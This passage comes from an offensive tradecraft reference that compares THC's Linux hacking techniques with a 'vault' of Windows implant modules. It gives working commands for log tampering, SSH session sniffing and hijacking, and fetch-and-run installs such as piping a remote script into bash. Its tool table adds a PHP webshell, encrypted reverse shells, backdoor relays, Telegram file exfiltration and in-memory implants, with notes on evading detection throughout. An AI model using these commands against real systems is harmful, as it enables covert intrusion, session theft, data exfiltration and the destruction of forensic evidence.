- **Vault link**: T-020 `self_delete.rs` (self-deletion via ADS rename) — vault's Windows-side anti-forensic. T-016 PEB unlink (hide module from process). T-021 string obfuscation.
- **Tool/code**: `shred`, `touch -r`, `chattr +i/+a`, `> /var/log/wtmp`.
- **OPSEC**: Truncating logs is a high-signal event in SIEMs. Prefer selective editing (e.g., `sed -i '/attacker_ip/d' /var/log/auth.log`) over truncation. `chattr +i` on system files breaks package management and is a tell.

### Session Sniffing / Hijacking
- **What**: Capture or take over an active user SSH/shell session.
- **When to use**: Privileged user is connected — steal their session rather than re-authenticating.
- **How**:
  - **strace SSHD**: `strace -p <sshd_pid> -e trace=read,write -s 99999 -o /tmp/ssh.log` — captures cleartext inside the SSHD process before encryption/after decryption.
  - **dtrace / eBPF**: `bpftrace` with `tracepoint:syscalls:sys_enter_read` on `/bin/bash`'s fd 0/1 — capture all shell I/O across the system.
  - **Wrapper script**: rename `/usr/bin/ssh` → `/usr/bin/ssh.real`, drop a wrapper that tees I/O to a log.
  - **SSH-IT**: THC's tool, fully automated — `curl https://thc.org/ssh-it | bash` then every SSH invocation on the host is transparently sniffed.
  - **Hijack running session**: `reptyr` (ptrace-based) or `nsenter` into the bash's namespace.
- **Vault link**: T-023 keylogger.rs + browser_hook.rs — vault's session-capture analogues. T-020 IAT camouflage. The vault captures at the Win32 message layer; THC captures at the syscall/process layer.
- **Tool/code**: `strace -p`, `bpftrace`, `reptyr`, `nsenter`, `SSH-IT`.
- **OPSEC**: `strace` and `bpftrace` require root + `CAP_SYS_PTRACE`. Audited by default on hardened kernels. The wrapper-script rename is trivially detected by file integrity monitors (AIDE, Tripwire).

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `hackshell.sh` (`thc.org/hs`) | Silent bash bootstrap — disables history, RAM tmpdir | Fetch over HTTPS leaks to NDR; pre-stage locally |
| `exec -a NAME CMD` | Spoof `argv[0]` to impersonate benign daemon | Does NOT change `/proc/PID/exe` symlink |
| `zapper` (THC) | Zero `argv` after execve, set `argv[0]` | Zapper binary itself is visible in `/proc/*/exe` |
| `~/.bashrc` function hijack (`netstat(){ ...; }`) | Filter attacker entries from `ps`/`netstat` | Defeated by absolute-path invocation (`/bin/ps`) |
| `/usr/local/sbin/netstat` plant | PATH hijack for root invocations | Requires root; visible to file integrity monitors |
| `mount -n --bind /dev/shm /proc/PID` | Hide PID from `/proc` enumeration | Requires `CAP_SYS_ADMIN`; audited by auditd |
| `echo -e "\033[2K\033[1A"` | ANSI hide line from `cat` | Defeated by `cat -A`, `xxd`, `sed` |
| `touch -r ref target` | Copy mtime from benign file | Doesn't update ctime (always current on Linux) |
| `chattr +i` | Immutable flag (root) | Breaks package management — high-signal |
| `ssh -T -o UserKnownHostsFile=/dev/null` | No PTY, no known_hosts write | Server-side `auth.log` still logs the connection |
| `ssh -M -S .sshmux` | Master mux — one TCP for many sessions | Long-lived connection is itself a fingerprint |
| `ssh -L/G -R PORT:HOST:PORT` | Forward/reverse tunnel | `-g` (GatewayPorts) binds to all IFs |
| `ssh -D 1080` | SOCKS5 listener via SSH | SOCKS-over-SSH detectable by DPI |
| `ssh -J hop1,hop2,target` | ProxyJump multi-hop pivot | Each hop logs locally; correlation possible |
| `ssh-j.com` | Free NAT-traversal relay | Public relay — domain is a known IOC |
| `sshd -f /dev/null -p PORT` | User-land SSHD | Host key file in `~/.ssh` is unusual |
| `gs-netcat` (gsocket.io) | Encrypted backdoor + relay overlay | Persistent process visible in `ps` |
| `<?=`$_GET[0]`?>` | 13-char PHP webshell | Defeated by AST-based webshell scanners |
| `mkfifo + openssl s_client` | Encrypted reverse shell | `mkfifo` file is visible in `/tmp` |
| `python -c pty.spawn` | Upgrade dumb shell to PTY | Writes utmp — visible in `w`/`who` |
| `socat exec:bash,pty,... TCP:` | Fully interactive encrypted shell | `socat` rarely pre-installed; pre-stage |
| `xargs -P20 --process-slot-var=SLOT` | Parallel workers with per-slot logging | 20+ concurrent SSH sessions trip netflow anomaly |
| `shred -uvz -n 3` | Secure file delete | SSD wear-level makes overwrite ineffective |
| `base64` / `xxd -ps` | File encode for clipboard exfil | ~33% size bloat; chunk ≤4KB per paste |
| `curl -F document=@file https://api.telegram.org/bot<TOKEN>/` | Telegram exfil | 50MB file cap; tokens subpoenable |
| `bpftrace` / `strace -p PID` | Sniff shell I/O / hijack session | Requires `CAP_SYS_PTRACE`; audited |
| `reptyr` / `nsenter` | Steal running session | ptrace-based; defeats most non-hardened kernels |
| `memfd_create` | In-memory implant (no FS artifact) | Visible in `/proc/PID/maps` as `memfd:` |

## Gaps & Extensions

### What the vault covers that THC does not
- **Windows-specific evasion**: T-016 (AMSI/ETW patching, NTDLL unhook, advanced multi-frame stack spoofing) — THC has no Windows counterpart.
- **Sleep obfuscation**: T-005 Ekko ROP Sleep (6-frame ROP PE encryption during sleep) — no Linux equivalent exists in THC; on Linux, the equivalent is simply `SIGSTOP`/encrypted-swap, which is operationally inferior.
- **Advanced process injection**: T-007 Pool Party, T-008 Threadless, T-009 Process Ghosting, T-010 Herpaderping, T-011 Dirty Vanity, T-012 Early Cascade — all Windows-only; THC has no Linux injection techniques (Linux uses `LD_PRELOAD`, `ptrace`, `process_vm_writev` instead, none of which are documented in this batch).
- **Syscall-level evasion**: T-001 RecycledGate, T-002 Hell's/Halo's/Tartarus Gate, T-003 VEH Gate — Windows syscall-number randomisation problem does not exist on Linux (syscall numbers are stable in the kernel ABI).
- **Edo Tensei / Edo Dead Drop**: T-018/T-019's autonomous C2 via Google Translate / Ethereum TX / steganography — THC uses simpler public relays (ssh-j.com, gsocket.io). Vault's approach is significantly more resilient to blocking.

### What THC covers that the vault doesn't
- **Linux shell bootstrap** (`hackshell.sh`): a one-line silent-shell bootstrap that the vault has no equivalent of. Useful for any Linux landing.
- **`exec -a` process spoofing**: trivial Linux mechanism the vault could conceptually mirror on Windows by also spoofing `IMAGE_PATH` via `NtSetInformationProcess(ProcessImageFileName)`.
- **`/proc/PID` bind-mount hiding**: a powerful no-rootkit process-hiding primitive unique to Linux — no Windows equivalent because Windows has no procfs.
- **ANSI/CR file obfuscation**: at-rest file obfuscation that the vault's compile-time string obfuscation (T-021) does not address. 
- **`ssh-j.com` and `gsocket.io` as relays**: zero-infra pivoting services that complement the vault's self-hosted relays (T-022 juubi.rs). Useful for first-land situations where no C2 is yet established.
- **Session sniffing via `strace`/`bpftrace`/`reptyr`**: in-process session capture without modifying the target binary — the vault's keylogger (T-023) hooks at the message layer (Windows); THC's approach hooks at the syscall layer (Linux).
- **Cut & paste / tmux buffer file transfer**: a no-network exfil primitive that the vault's amaterasu.rs (T-023) does not implement. Useful for air-gapped terminal scenarios.
- **Telegram exfil**: a specific instance of "abuse legitimate service" that the vault's Edo Dead Drop (T-019) generalises — the vault could add Telegram as a transport plugin.
- **Reverse shell one-liners across 7 runtimes** (bash/cURL/OpenSSL/Python/Perl/PHP): the vault has no equivalent collection; useful for post-RCE on Linux appliances.

### Areas where THC is outdated or superseded by the vault
- **`/dev/shm` as RAM-backed TMPDIR**: still useful on Linux, but the vault's in-memory `memfd_create`-backed implant (T-007 module-overloading variant) is superior on Windows.
- **PATH hijack for `netstat`/`ps`**: trivially defeated by absolute-path invocation (`/usr/bin/ps`); the vault's approach (PEB unlink, handle blocking) is harder to defeat because it manipulates the data structure rather than the enumerator.
- **`bashrc` history suppression**: defeated by auditd/`bash` builtin auditing. The vault's compile-time string obfuscation (T-021) survives runtime inspection.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| Hackshell silent bootstrap | T-020 anti-analysis (`self_delete.rs`, `iat_camo.rs`) | Same goal (zero footprint); THC does shell-level, vault does binary-level |
| `exec -a` process name spoofing | T-016 arg spoofing (`arg_spoof.rs`) + PPID spoofing (T-015) | Direct Linux/Windows analogue; both lie about process identity |
| Zapper command-line wiping | T-016 arg spoofing (post-`CreateProcessW` `argv` rebuild) | Identical outcome; different OS layer |
| `~/.bashrc` netstat/ps hijack | T-016 PEB unlink + `block_handle.rs` | Both hide artifacts from enumerators; vault manipulates data structure, THC manipulates enumerator |
| `/proc/PID` bind-mount hiding | T-016 PEB unlink + T-020 anti-VM | Functional analogue; no direct Windows equivalent |
| ANSI/CR file obfuscation | T-021 string obfuscation (`obf/src/lib.rs`) | Vault does compile-time in-binary; THC does at-rest file-level — complementary |
| `ssh -M -S` master multiplexing | T-022 `juubi.rs` peer relay | Both multiplex sessions over one transport |
| `ssh -L/-R/-D` tunnels | T-022 `kamui.rs` SOCKS5 + `juubi.rs` relay | Vault implements custom protocol; SSH provides native |
| `ssh -J` ProxyJump multi-hop | T-022 `juubi_chain.rs` + `rikudo.rs` multi-chain vault | SSH does it for SSH only; vault does it for arbitrary TCP |
| `ssh-j.com` / `gsocket.io` relays | T-019 Edo Dead Drop (`edo_dead_drop.rs`) | Both solve autonomous-C2 for NATed hosts; vault uses legitimate services (Translate, Ethereum), THC uses dedicated relays |
| User-land `sshd -f /dev/null` | T-019 Edo Dead Drop + T-022 kamui.rs | Same role (user-space TCP multiplexer); different mechanism |
| `mkfifo + openssl s_client` reverse shell | T-019 discovery.rs (server URL discovery) | Both bootstrap operator-to-implant channel |
| `python -c pty.spawn` shell upgrade | T-023 client_rust shell capabilities | Vault targets Windows; no Linux PTY upgrade impl |
| `gs-netcat` backdoor | T-017 Five-Layer Persistence + T-018 Edo Tensei | THC is one-shot Linux persistence; vault is multi-layer Windows persistence + polymorphic resurrection |
| PHP `<?=`$_GET[0]`?>` webshell | T-017 COM hijack + T-023 browser_hook.rs | Different persistence surface (web vs COM vs browser) |
| LD_PRELOAD rootkit | T-016 PEB unlink + arg spoofing | Same goal (hide from enumerators); different injection point |
| `memfd_create` self-extracting implant | T-007 Process Hollowing + T-009 Process Ghosting + T-010 Herpaderping | Vault has 3 Windows variants of "execute without disk artifact"; Linux has one simpler primitive |
| `shred -uvz` secure delete | T-020 `self_delete.rs` (ADS rename) | Same goal (anti-forensic file removal); vault uses ADS rename, THC uses overwrite+unlink |
| `touch -r` mtime spoof | T-020 IAT camouflage + T-021 compile-time string obf | Different layer (filesystem vs binary); both reduce forensic trail |
| `chattr +i` immutability | T-016 policy (Block-DLL + ACG) | Both prevent modification by external actors; vault at process-policy level, THC at filesystem level |
| `strace`/`bpftrace`/`reptyr` session sniff/hijack | T-023 `keylogger.rs` + `browser_hook.rs` | Vault captures at Win32 message layer; THC at syscall layer |
| Telegram exfil | T-019 Edo Dead Drop + T-023 `amaterasu.rs` | Vault generalises; THC's Telegram is a specific transport the vault could adopt |
| `xargs -P20` parallel host action | T-022 `juubi_chain.rs` chain management | Both orchestrate parallel peer/host actions |
| `base64`+tmux clipboard exfil | T-023 `amaterasu.rs` exfil engine | Vault has structured protocol; THC has manual fallback for no-network scenarios |
| SSH-IT session sniffing wrapper | T-023 `browser_session.rs` + `keylogger.rs` | Both intercept user sessions; THC does it for SSH/shell, vault for browser |

---
